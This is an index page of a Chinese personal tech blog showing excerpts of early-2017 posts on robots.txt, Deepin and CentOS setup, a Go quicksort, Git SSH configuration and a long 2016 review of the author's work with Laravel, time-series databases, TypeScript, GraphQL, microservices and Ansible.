          <p>由于本站文章搜索引擎搜索机器人（以下简称：爬虫）爬取效果不是很理想，出现了导航链接大量被爬取，而文章链接爬取较少。所以准备对本站加入 SEO，其实也就是引入了 <a target="_blank" rel="noopener" href="http://baike.baidu.com/link?url=2cB03FvdeTNWMUFlQEQxT4E6FxQ7DGXQr7Q6tAt702pNePMjVODT4Sj1vxp9W5ehdG9QP6dUZBrsiIJNYphnkPz6M9D8nHmbo7sdLNEydcg7QVqgnu4LUIGKTg5v-3ii0JqcHLrvxcBzN1UNBBH3fWBWmVlh3Jh0kSpoybswT7_">Robots协议</a> 。Robots 协议（也称为爬虫协议、机器人协议等）的全称是「<a target="_blank" rel="noopener" href="http://baike.baidu.com/link?url=qZmXuLBjgnHeD9Q-gV4Rg1QAZOF04_MbuFOQRLaA_jZqIBgqVkbtVA-8YAzHo3mFwtrL2l0vrfmgw97OlU2R36hMv0KGgRTFOnl2lonhJ7J4Uspy3WCTiGCtpGK65BCc">网络爬虫排除标准</a>」（Robots Exclusion Protocol）。网站通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，而 <strong>robots.txt 文本文件</strong> 就是 Robots 协议的表述。</p>
<p><img src="//www.fanhaobai.com/2017/01/robots/n9DQpbXNbazisDMy_bouP7HN.png">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/12/2017/01/robots/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/12/Kubernetes-&-Deepin-Settings@1-12/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/12/Kubernetes-&-Deepin-Settings@1-12/" itemprop="url">Deepin初始化</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-12T00:00:00+08:00">
                2017-01-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index">
                    <span itemprop="name">Linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <h2 id="Infinality-and-Harfbuzz"><a href="#Infinality-and-Harfbuzz" class="headerlink" title="Infinality and Harfbuzz"></a>Infinality and Harfbuzz</h2><p>会发生冲突，这是今天Archlinux无法启动输入法界面的元凶。重新安装freetype2\fontconfig\cairo以替换infinality-bundle。</p>
<h2 id="添加PPA出现GPG问题"><a href="#添加PPA出现GPG问题" class="headerlink" title="添加PPA出现GPG问题"></a>添加PPA出现GPG问题</h2><h4 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gpg: keybox <span class="string">&#x27;/tmp/tmpyiw6jvck/pubring.gpg&#x27;</span> created</span><br><span class="line">gpg: /tmp/tmpyiw6jvck/trustdb.gpg：建立了信任度数据库</span><br><span class="line">gpg: 密钥 531EE72F4C9D234C：公钥“Launchpad webupd8”已导入</span><br><span class="line">gpg: 合计被处理的数量：1</span><br><span class="line">gpg:           已导入：1</span><br><span class="line">gpg: 找不到有效的 OpenPGP 数据。</span><br></pre></td></tr></table></figure>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/12/Kubernetes-&-Deepin-Settings@1-12/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/10/Basic%20Algorithms%20in%20Go/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/10/Basic%20Algorithms%20in%20Go/" itemprop="url">Basic Algorithms in Go</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-10T00:00:00+08:00">
                2017-01-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ACM/" itemprop="url" rel="index">
                    <span itemprop="name">ACM</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>最近学Go，感觉挺不错的。闲来无事用它写了几种常用的基础算法。</p>
<h2 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h2><p>思想很简单，实现起来为了方便每次以left作为基准，也可以使用BFS来节省递归栈：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// QuickSort returns a sorted slice</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">QuickSort</span><span class="params">(arr []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt;= <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	left, right := <span class="number">0</span>, <span class="built_in">len</span>(arr)<span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">		<span class="keyword">if</span> arr[left+<span class="number">1</span>] &gt; arr[left] &#123;</span><br><span class="line">			arr[left+<span class="number">1</span>], arr[right] = arr[right], arr[left+<span class="number">1</span>]</span><br><span class="line">			right--</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			arr[left+<span class="number">1</span>], arr[left] = arr[left], arr[left+<span class="number">1</span>]</span><br><span class="line">			left++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	QuickSort(arr[:left])</span><br><span class="line">	QuickSort(arr[left+<span class="number">1</span>:])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/10/Basic%20Algorithms%20in%20Go/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/07/%E4%B8%BA%E6%9C%AC%E6%9C%BAGit%E9%85%8D%E7%BD%AESSH%E9%93%BE%E6%8E%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/07/%E4%B8%BA%E6%9C%AC%E6%9C%BAGit%E9%85%8D%E7%BD%AESSH%E9%93%BE%E6%8E%A5/" itemprop="url">为本机Git配置SSH链接</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-07T20:24:00+08:00">
                2017-01-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>访问代码仓库时，需要建立安全链接，对于Git，常用的安全链接协议有HTTPS和SSH两种。HTTPS使用更简单，只需在向仓库提交代码时提供一下用户名和密码即可。但是经常出现需要频繁提供用户名和密码的情况，这个不能忍。相比之下，SSH的方式虽然配置有点难，但一次配置，次次可用，是个更好的方式。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/07/%E4%B8%BA%E6%9C%AC%E6%9C%BAGit%E9%85%8D%E7%BD%AESSH%E9%93%BE%E6%8E%A5/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/07/2017/2017-01-07-programming-of-2016/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/07/2017/2017-01-07-programming-of-2016/" itemprop="url">2016 年度小结（技术方面）</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-07T00:00:00+08:00">
                2017-01-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p>今年年初我花了三个月的业余时间用 Laravel 开发了一个项目，在此之前，除了去年换工作准备面试时，我并没有正经地用过什么 PHP 框架。在我看来，Laravel 其实并没有太多的独创性，而只是把其他社区中那些被实践证明非常有价值的东西带到了 PHP 社区，例如自动测试、包管理、依赖注入等等。</p>
<p>回到 PHP 本身，PHP7 无论在语言特性还是性能上都无可挑剔，我觉得限制它的使用的更多的是在异步模型上 —— 或者说它缺少一个好的异步模型。也许有人觉得 Node.js 的事件队列十分难以捉摸，但由于 Node.js 是我在生产环境使用得最多的语言，我十分熟悉 Node.js 的异步模型，对其他「普通」的语言的异步模型却比较难以接受。今年我在 Openresty 中写了一些 Lua 代码，对 Lua 的协程也有了一些简单的了解，同时我也了解到在 Python 中被使用最多的异步模型同样也是基于协程。</p>
<p>协程最大的好处是不会对代码有侵入性 —— 你写代码的时候依然是照常地写同步代码，只需在执行的时候引入协程（对于 Web 服务就是在每收到一个请求的时候启动一个协程）就可以享受轻量级进程的好处，用更低的 CPU 和内存开销来支持更高的并发。相比之下 Node.js 的异步代码则是显式的，需要时刻考虑异步的问题，也很容易出现疏忽和错误。而且异步的函数是有传染性的，如果你调用了一个异步函数，那么后面的代码都要用异步的方式写，虽然我们有 Promise 等异步抽象，但这其实就是侵入性的体现 —— 你必须选择一个异步抽象，这个异步抽象会混入你所有的代码。</p>
<p>那是不是说 Python 的协程就比 Node.js 的事件队列要好呢？其实我觉得大部分的情况下是这样的，但从理论上来说，Node.js 还是会有更好的性能，因为协程虽然比线程要轻量级，但依然是一种封装 —— 需要在协程之间调度，需要保存和恢复执行上下文，而 Node.js 的异步是没有任何的封装的 —— Node.js 里你没有办法去管理异步任务（domain 模块也早就被 deprecated 了），因为异步任务并不是运行在像协程的这样一个容器里的，因此省掉这一层抽象会带来更好的性能。</p>
<p>Laravel 是一个一站式的开发框架，我之前并没有用过这类的框架，在 Node.js 中也不是很流行这样的框架，好处自然就是组件之间有着很好的兼容性和一致的设计，质量也有保证；劣势则是选择的余地比较少（实际上服务容器的概念就是为了弥补一站式框架不便于更换组件的问题），因为这些组件是框架整体的一部分，所以对一些比较小众的需求缺乏支持，这些组件也较少考虑脱离 Laravel 独立地使用。</p>
<hr>
<p>今年我还花了很多时间去了解和使用 InfluxDB 这样的时序数据库，在 Web 后端的开发过程中，有很多日志、监控、统计类的数据都是时序数据 —— 这些数据量会很大、每一条都和一个时间关联、查询时通常也按照时间范围进行查询、查询时我们通常会将一段时间的数据进行分组和聚合。InfluxDB 为了支持基于 Tag 的筛选和分组，采用了按列存储的方式 —— 每个 Tag 的值的组合都被称作一个序列，被独立地存储以备检索。</p>
<p>因为这些数据都和时间关联，同时数据库也提供了比较好的对分组和聚合的支持，所以可以很轻松地使用 Chronograf 或 Grafana 之类的可视化工具画出图表，对这些指标进行监控。实际上去年我做了一个和时序数据库非常相关的项目，即 <a target="_blank" rel="noopener" href="https://github.com/leancloud/leanengine-sniper">leanengine-sniper</a>，今年我又花了一些时间把这个算是自部署的系统包装成了一个云服务（<a target="_blank" rel="noopener" href="https://apm.leanapp.cn/">LeanEngine APM</a>），实际上这就是一个针对特定场景的、简易的时序数据库和基于时序数据的可视化工具。</p>
<hr>
<p>做一个象棋 AI 是我一直以来的一个想法，于是今年接着 AlphaGo 的热度，我用 TypeScript、React 和 Web Worker 等技术在浏览器中实现了一个非常弱的国际象棋 AI —— <a target="_blank" rel="noopener" href="https://jysperm.me/2016/06/wizard-chess/">Wizard Chess</a>。其实只能说是把关键的组件都实现了出来，但实际上 AI 走的每一步棋都很弱。显然这是一个对性能非常敏感的项目，根据我去年的经验要尽可能避免对数据的修改，但在我调研了 Immutable.js 之后我并没有选用它，因为我觉得可能我不需要它提供的那么复杂的数据结构，而是自己在编码时注意不要修改参数、函数总是返回新的对象即可。</p>
<p>在 Wizard Chess 中我也试用了 TypeScript，它给 JavaScript 实现了编译期的类型检查，这会非常有助于在编译期发现和类型有关的错误，但并不能做到真正的静态类型语言的那种程度，尤其 JavaScript 中存在大量取值为 null 或 undefined 的情况，同时需要为所使用的库找到定义文件也是一大痛点。</p>
<p>到目前大家已经普遍认为 TypeScript 比 CoffeeScript 有着更好的前景，CoffeeScript 这个项目也显得有些疏于维护了，这令我非常痛心。虽然 ES2015 已经补齐了 JavaScript 语言本身的一些短板，但我觉得 CoffeeScript 还是有它独特的价值的，比如用缩进区分代码块、更少的括号，以及通过问号进行空值判断。</p>
<hr>
<p>为项目撰写 HTTP API 文档一直是一个很纠结的事情，为了他人阅读和理解容易，应该详细地列出所有参数的细节，但这样又会导致文档有大量重复的内容，维护将会十分困难。用来生成 HTTP API 文档的方案有很多，我最后选择了 RAML —— 这是一个基于 YAML 的用来定义 HTTP API 的语言，它提供了非常多的特性（type、resourceType、trait）来对定义进行复用，你可以根据你的代码的架构去组织这些定义（例如如果几个接口都挂载了同样的中间件，便可以使用一个 trait 来定义这个中间件的行为），最后通过一个编译环节生成可以阅读的 API 文档。</p>
<p>后来我还了解了一下 GraphQL，并实现了一个 <a target="_blank" rel="noopener" href="https://jysperm.me/2016/12/leancloud-graphql">在 LeanCloud 上使用 GraphQL</a> 的 Demo，GraphQL 解决了 RESTful API 缺乏范式、类型不够严格、对关系数据支持弱、难以发现等问题。但目前对 GraphQL 的应用仍非常有限，我想大概是为了支持 GraphQL 需要服务器端进行很大的改动，同时引入这样一层复杂的抽象，也会带来很大的性能开销，可能 GraphQL 更适合的场景会是 BaaS 和开放 API 吧。</p>
<hr>
<p>如果说我在番茄土豆学到的是如何开新坑、如何以开放的心态去接受新的技术的话，在 LeanCloud 这一年多则是去长时间地维护一个复杂的系统，在保证兼容性和可用性的前提下，渐进式地对系统进行改进，引入新的技术。之前在番茄土豆的时候，也是因为自己的水平提高得比较快，经常想要进行一次彻底的重构  —— 其实应该称之为重写才对。但往往没有好的结果，因为这种大的重写会花费很多的时间，会导致新版本和原有代码差别越来越大，甚至更换了新的语言或数据库，很难保证和原有代码有着一样的行为。同时因为数据操作的不兼容，在上线时也必须一下子全量上线，结果就是导致最后的上线时间一拖再拖。</p>
<p>今年上半年云引擎也有过一次很大的 <a target="_blank" rel="noopener" href="https://blog.leancloud.cn/4292">改版</a>，允许用户对实例进行更多的管理以及大量的内部重构，其中我得到的经验就是要进行渐进式的重构  —— 将大的修改划分为若干个小任务，逐步地将这些小修改上线进行测试，而不是一次性上线一个大的修改。让新旧代码混跑一段时间，保证新旧代码对数据的操作是互相兼容的，虽然在开发上需要实现很多过渡代码，在过渡完成后还需要清理这部分代码，但这种出现问题可以随时回滚的能力会让你对上线新的修改非常有信心，反而能够加速整体的重构进程。</p>
<p>今年在 LeanCloud 我也开了几个新坑，的确新的项目在发布或上线之前的进化速度是非常快的，一旦有好的想法就可以立刻实施而不必顾及兼容问题，甚至也可以跳过很多的测试和 Code Review。有句话是说「不要过早的进行优化」，但我有些怀疑这个观点，在正式发布或上线之前很可能是最好的优化时机，至少要考虑到后续的优化并预留出修改的空间。一旦项目上线，那么每个修改都要有充分的理由、都要去顾及兼容性并进行全面的测试，这时再进行优化会是非常低效的，我也的确遇到一些项目是因为最开始的设计失误导致后期几乎没办法去优化。</p>
<hr>
<p>随着 Docker 生态的发展，「微服务」是个比较火热的话题，但大都还是一些方法论，没看到太多具体的实践经验。目前我对微服务的理解主要是两方面，一是对项目进行拆分，减少单个开发者需要接触的代码量；另一方面是对服务进行隔离，缩小故障的影响范围，更好地进行水平拓展。今年我也基于这两个出发点进行了一些实践 —— 项目的不同服务使用同一个代码库，互相共享很大一部分代码，包括自动测试也是在一起运行的。但每个服务有着不同的入口点，会被单独地部署和运行。</p>
<p>大概这是一种不够彻底的微服务吧，我知道当然可以将共同的代码发布为单独的包，来实现更加彻底的拆分。但把一个组件独立为一个包其实是一个很严肃的事情，可能需要它有单独的仓库、文档、版本号，当 API 发生变化时还要考虑兼容。对于一个还没有那么复杂的项目来说，这个开销可能会很大程度上影响迭代速度，所以我还是选择使用同一代码库，这样进行修改时会更加灵活，通过自动测试来保证修改不会引入问题。</p>
<p>如果已有服务化的基础设施，这种服务的拆分其实还是很容易的，但如果从头搭建一套微服务的基础设施则还是需要一些工作的。例如为了管理不同服务的配置，标准化部署过程，你需要一个 CI；为了提供不同服务所需要的环境、在运行时进行隔离，你需要有一个容器引擎；为了管理和调度容器、充分利用资源，你还需要一个集群管理器；为了能够平滑地进行部署，你还需要服务发现和负载均衡；为了收集和检索日志，你还需要一套日志收集和分析器；更别提还有的统计、监控和报警需求了。对于这些基础设施我也有自己的一些实践和看法，我还是比较期待新的一年里能在业余时间按照我自己的选择去搭建一个这样的微服务平台，大概也算是给 RootPanel 划上一个句号。</p>
<hr>
<p>很时候服务不可用都是因为数据库的问题导致的，不同于无状态的负载均衡或应用容器，数据库存储了所有的状态，这意味着你不能简单地重新创建一个数据库实例，而必须要顾及到其中的数据。为了保证数据库的可用性，最简单的办法就是运行多个数据库实例，互相之间同步数据，在故障时切换到另外一个实例。但这样又会引入新的问题，如果发生网络分区怎么办？于是我开始深入地了解 CAP 提出的分布式系统的限制，了解 Paxos 这样的算法如何在分布式的系统中达成共识，也了解了各种数据库提供了怎样的分布式能力和怎样的高可用解决方案，这样在以后为项目选择数据库的时候应该会更加有针对性。</p>
<p>在这个过程中我也读到了「SRE: Google 运维解密」新出版的中文版，书中介绍了作为世界上最大的互联网公司，Google 是如何在规模迅速增长的情况下继续保证服务的可用性的。书中介绍了很多原则和方法，读完这本书让我觉得热血沸腾，相比于写代码实现确定的需求，也许去应对未知的故障会更有趣？但在此之前可能还有很多知识需要学习，首先在一番纠结后，选择了 Ansible 作为配置管理工具，开始尝试将我的服务器上的所有服务都通过定义文件进行描述，这项工作持续了将近三个月的时间，到现在还未全部完成。用一组定义文件去代替对服务器的直接操作，这样的好处是非常明显的 —— 这些文件可以进入版本控制让所有修改有据可查，可以随时应用在新的服务器上，也可以随时在已有的服务器上进行验证和重放，通过 Ansible 这类工具所提供的特性，也可以对这些配置进行高层次的抽象，来管理更复杂的配置和大量的服务器。</p>
<p>我们不光要使用不可变的数据结构来控制可变状态，像服务器这样的基础设施也可以让它们变成「不可变」的。其实 Docker 的容器就是一个很好的例子，所有的容器都是从 Dockerfile 生成出来的，当你需要修改容器中的运行环境的时候，你不是直接在容器内进行修改，而是去修改 Dockerfile —— 因为它是容器的模板。我们也可以总是通过定义文件来描述基础设施，每次修改后都重新验证服务器与定义文件中的描述一致，这样我们便不必关心服务器上的状态了。也不会出现服务器多人维护，配置混乱难以迁移的情况了，它永远看上去和新的一样。</p>
<hr>
<p>此外今年我还公开或半公开地做了五次技术分享，准备每个分享都花了我起码半个月的时间，其中的四次已经被我整理成了文字版本：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://jysperm.me/2016/05/blockchain-slides/">Blockchain 和 Ethereum</a></li>
<li><a target="_blank" rel="noopener" href="https://jysperm.me/2016/08/docker-and-containerization">Docker 在共有云上的实践</a></li>
<li><a target="_blank" rel="noopener" href="https://jysperm.me/2016/10/nodejs-error-handling/">Node.js 错误处理实践</a></li>
<li><a target="_blank" rel="noopener" href="https://jysperm.me/2016/11/behind-atom">Atom 背后的故事</a></li>
</ul>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/04/CentOS2@1-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/04/CentOS2@1-4/" itemprop="url">Centos初始化2</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-04T00:00:00+08:00">
                2017-01-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index">
                    <span itemprop="name">Linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <h2 id="proxychains-ng"><a href="#proxychains-ng" class="headerlink" title="proxychains-ng"></a>proxychains-ng</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rofl0r/proxychains-ng</span><br><span class="line"><span class="built_in">cd</span> proxychains-ng                                 </span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc </span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">make install-config   <span class="comment"># 生成配置文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;http 10.100.100.136 4411&#x27;</span> &gt;&gt; /etc/proxychains.conf  <span class="comment"># 输入代理设置</span></span><br></pre></td></tr></table></figure>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/04/CentOS2@1-4/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/04/Kubernetes%E9%83%A8%E7%BD%B2@1-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/04/Kubernetes%E9%83%A8%E7%BD%B2@1-5/" itemprop="url">Kubernetes部署</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-04T00:00:00+08:00">
                2017-01-04
              </time>
            

            

            
          </span>

          
